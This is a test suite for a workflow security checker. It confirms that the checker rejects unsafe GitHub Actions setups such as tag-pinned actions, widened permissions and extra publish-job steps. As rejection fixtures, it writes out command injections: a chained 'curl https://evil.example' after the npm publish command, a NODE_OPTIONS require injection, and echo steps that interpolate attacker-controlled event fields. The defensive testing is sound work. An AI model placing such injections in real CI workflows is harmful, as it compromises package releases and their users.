import { spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';

const script = new URL('../../../scripts/check-workflows.mjs', import.meta.url).pathname;
const real = (f: string) => readFileSync(new URL(`../../../.github/workflows/${f}`, import.meta.url), 'utf8');
const dirs: string[] = [];

function run(files: Record<string, string>) {
  const d = mkdtempSync(join(tmpdir(), 'wfchk-'));
  dirs.push(d);
  for (const [name, text] of Object.entries(files)) writeFileSync(join(d, name), text);
  const r = spawnSync(process.execPath, [script, d], { encoding: 'utf8' });
  return { code: r.status, err: r.stderr };
}

afterEach(() => { while (dirs.length) rmSync(dirs.pop()!, { recursive: true, force: true }); });

describe('check-workflows gate', () => {
  it('accepts the real workflows', () => {
    const r = spawnSync(process.execPath, [script], { encoding: 'utf8' });
    expect(r.status).toBe(0);
  });
  it('rejects an action pinned to a tag', () => {
    const r = run({ 'ci.yml': real('ci.yml').replace(/actions\/checkout@[0-9a-f]{40}/, 'actions/checkout@v4') });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/not pinned to a commit SHA/);
  });
  it('rejects pull_request_target', () => expect(run({ 'ci.yml': real('ci.yml').replace('pull_request:', 'pull_request_target:') }).code).toBe(1));
  it('rejects a missing or widened permissions block', () => {
    expect(run({ 'ci.yml': real('ci.yml').replace('permissions:\n  contents: read\n', '') }).code).toBe(1);
    expect(run({ 'ci.yml': real('ci.yml').replace('permissions:\n  contents: read\n', 'permissions:\n  contents: write\n') }).code).toBe(1);
  });
  it('rejects a checkout that keeps credentials', () => {
    expect(run({ 'ci.yml': real('ci.yml').replace('persist-credentials: false', 'persist-credentials: true') }).code).toBe(1);
    expect(run({ 'ci.yml': real('ci.yml').replace(/\n {10}persist-credentials: false/g, '') }).code).toBe(1);
  });
  it('rejects id-token outside a release workflow', () => {
    expect(run({ 'ci.yml': real('ci.yml').replace('jobs:\n', 'jobs:\n  x:\n    permissions:\n      id-token: write\n    runs-on: ubuntu-latest\n    steps: []\n') }).code).toBe(1);
  });
  it.each(['push', 'schedule', 'release', 'pull_request', 'workflow_run'])('rejects a release workflow that also triggers on %s', (t) => {
    const text = real('release-npm.yml').replace('on:\n  workflow_dispatch:\n', `on:\n  workflow_dispatch:\n  ${t}:\n`);
    const r = run({ 'release-npm.yml': text });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/only on workflow_dispatch/);
  });
  it('rejects a release workflow that is not on workflow_dispatch at all, or has no environment', () => {
    expect(run({ 'release-npm.yml': real('release-npm.yml').replace('workflow_dispatch:', 'push:') }).code).toBe(1);
    expect(run({ 'release-pypi.yml': real('release-pypi.yml').replace(/ {4}environment: .*\n/, '') }).code).toBe(1);
  });
  it('rejects attacker-controlled context in an expression', () => {
    expect(run({ 'ci.yml': real('ci.yml').replace('- run: npm test', '- run: echo "${{ github.event.pull_request.title }}"') }).code).toBe(1);
  });

  // Two crafted files that once slipped past an earlier version of the gate: a widened top-level block that still starts with contents: read, and a
  // write scope the old fixed list did not name.
  it('rejects a top-level permissions block with an extra scope after contents: read', () => {
    const r = run({ 'ci.yml': real('ci.yml').replace('permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  packages: write\n') });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/top-level permissions block must be exactly contents: read/);
    expect(run({ 'ci.yml': real('ci.yml').replace('permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  actions: read\n') }).code).toBe(1);
    expect(run({ 'release-npm.yml': real('release-npm.yml').replace('permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  id-token: write\n') }).code).toBe(1);
    expect(run({ 'ci.yml': real('ci.yml').replace('permissions:\n  contents: read\n', 'permissions: read-all\n') }).code).toBe(1);
  });
  it.each(['security-events', 'attestations', 'pages', 'discussions', 'repository-projects'])('rejects %s: write in any job', (scope) => {
    const text = real('ci.yml').replace('jobs:\n', `jobs:\n  x:\n    permissions:\n      ${scope}: write\n    runs-on: ubuntu-latest\n    steps: []\n`);
    const r = run({ 'ci.yml': text });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(new RegExp(`${scope}: write is not allowed`));
  });
  it('reads only the first-level keys under on: as triggers', () => {
    const inputs = 'on:\n  workflow_dispatch:\n    inputs:\n      dry-run:\n        type: boolean\n';
    expect(run({ 'release-npm.yml': real('release-npm.yml').replace('on:\n  workflow_dispatch:\n', inputs) }).code).toBe(0);
    const r = run({ 'release-npm.yml': real('release-npm.yml').replace('on:\n  workflow_dispatch:\n', `${inputs}  push:\n`) });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/found: workflow_dispatch, push/);
  });
  it.each([
    '${{ github.event.workflow_run.head_branch }}',
    '${{ github.event.discussion.title }}',
    '${{ github.event.review_comment.body }}',
    '${{ github.head_ref }}',
    '${{ inputs.version }}',
    '${{ github.event.inputs.version }}',
    '${{ toJSON(github.event) }}',
  ])('rejects %s in an expression', (expr) => {
    expect(run({ 'ci.yml': real('ci.yml').replace('- run: npm test', `- run: echo "${expr}"`) }).code).toBe(1);
  });

  describe('release workflows: build and publish jobs', () => {
    const npm = () => real('release-npm.yml');
    const pypi = () => real('release-pypi.yml');
    const publishStep = '      - run: npm publish pkg/mercurifi-sdk-*.tgz --provenance --access public --ignore-scripts\n';
    it.each([
      ['an install step', publishStep.replace('npm publish', 'npm ci && npm publish')],
      ['a chained command', publishStep.replace('--ignore-scripts', '--ignore-scripts; curl https://evil.example')],
      ['a command hidden after a quoted hash', publishStep.replace('--ignore-scripts', '--ignore-scripts "#" ; curl x')],
      ['a test run', `${publishStep}      - run: npm test\n`],
      ['a multi-line run', `${publishStep}      - run: |\n          npm publish x.tgz\n          node -e "1"\n`],
      ['a cache action', `      - uses: actions/cache@0c45773b623bea8c8e75f6c82b208c3cf94ea4f9 # v4.0.2\n${publishStep}`],
      ['a step env', `${publishStep}        env:\n          NODE_OPTIONS: --require ./x.js\n`],
    ])('refuses %s in the npm publish job', (_, step) => {
      const r = run({ 'release-npm.yml': npm().replace(publishStep, step) });
      expect(r.code).toBe(1);
      expect(r.err).toMatch(/publish job/);
    });
    it('refuses a dependency cache on setup-node in the publish job', () => {
      const r = run({ 'release-npm.yml': npm().replace("          node-version: '24'\n", "          node-version: '24'\n          cache: npm\n") });
      expect(r.code).toBe(1);
      expect(r.err).toMatch(/no dependency cache/);
    });
    it('refuses checkout-and-build in the PyPI publish job', () => {
      const text = pypi().replace('      - uses: pypa/gh-action-pypi-publish', '      - run: uv build\n      - uses: pypa/gh-action-pypi-publish');
      expect(run({ 'release-pypi.yml': text }).code).toBe(1);
    });
    it('refuses a publish job without needs, environment or a publish step', () => {
      expect(run({ 'release-npm.yml': npm().replace('    needs: build\n', '') }).err).toMatch(/must need the build job/);
      expect(run({ 'release-pypi.yml': pypi().replace('    environment: pypi-release\n', '') }).err).toMatch(/protected environment/);
      expect(run({ 'release-npm.yml': npm().replace(publishStep, '') }).err).toMatch(/no publish step/);
    });
    it('refuses job keys that change what the publish job runs', () => {
      expect(run({ 'release-npm.yml': npm().replace('    environment: npm-release\n', '    environment: npm-release\n    container: node:24\n') }).err).toMatch(/container is not allowed/);
      expect(run({ 'release-npm.yml': npm().replace('    environment: npm-release\n', '    environment: npm-release\n    env:\n      X: y\n') }).err).toMatch(/env is not allowed/);
    });
    it.each(['github.repository_owner', 'github.actor', 'github.triggering_actor'])('requires %s in the publish guard', (ctx) => {
      const text = npm().replace(/(    if: .*)\n/, (_, line: string) => `${line.replace(new RegExp(`( && )?${ctx.replace('.', '\\.')} == '[^']*'`), '')}\n`);
      expect(text).not.toBe(npm());
      const r = run({ 'release-npm.yml': text });
      expect(r.code).toBe(1);
      expect(r.err).toMatch(new RegExp(`must require ${ctx.replace('.', '\\.')}`));
    });
    it('refuses an || in the publish guard', () => {
      expect(run({ 'release-npm.yml': npm().replace("github.triggering_actor == 'mercurifinance'", "github.triggering_actor == 'mercurifinance' || true") }).code).toBe(1);
    });
    it('refuses id-token or an environment on the build job', () => {
      const idToken = npm().replace('      contents: read\n    defaults:', '      contents: read\n      id-token: write\n    defaults:');
      expect(idToken).not.toBe(npm());
      expect(run({ 'release-npm.yml': idToken }).code).toBe(1);
      const env = pypi().replace('  build:\n', '  build:\n    environment: pypi-release\n');
      expect(run({ 'release-pypi.yml': env }).err).toMatch(/only the publish job/);
    });
    it('refuses a release job without its own permissions', () => {
      expect(run({ 'release-pypi.yml': pypi().replace('    permissions:\n      contents: read\n    defaults:', '    defaults:') }).err).toMatch(/set their own permissions/);
    });
  });

  it('runs the TypeScript suite on the .nvmrc Node version and on 24', () => {
    const nvmrc = readFileSync(new URL('../../../.nvmrc', import.meta.url), 'utf8').trim();
    const matrix = /node: \[([^\]]*)\]/.exec(real('ci.yml'))?.[1]?.split(',').map((v) => v.trim().replace(/'/g, ''));
    expect(matrix).toEqual([nvmrc, '24']);
  });
  it('pins every action with its exact tag in a comment', () => {
    for (const f of ['ci.yml', 'release-npm.yml', 'release-pypi.yml']) {
      for (const [line] of real(f).matchAll(/uses: .*$/gm)) expect(line).toMatch(/@[0-9a-f]{40} # v\d+\.\d+\.\d+$/);
    }
  });
});
